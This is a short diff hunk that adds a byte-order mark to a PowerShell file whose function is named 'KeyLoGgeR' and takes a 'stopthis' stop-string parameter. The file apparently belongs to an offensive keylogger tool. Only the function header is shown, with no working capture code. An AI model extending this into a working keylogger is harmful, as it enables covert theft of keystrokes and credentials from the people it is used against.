@@ -1,4 +1,4 @@
-function KeyLoGgeR {
+﻿function KeyLoGgeR {
     [CmdletBinding()]
     param(
         [string]$MagicString = "stopthis",
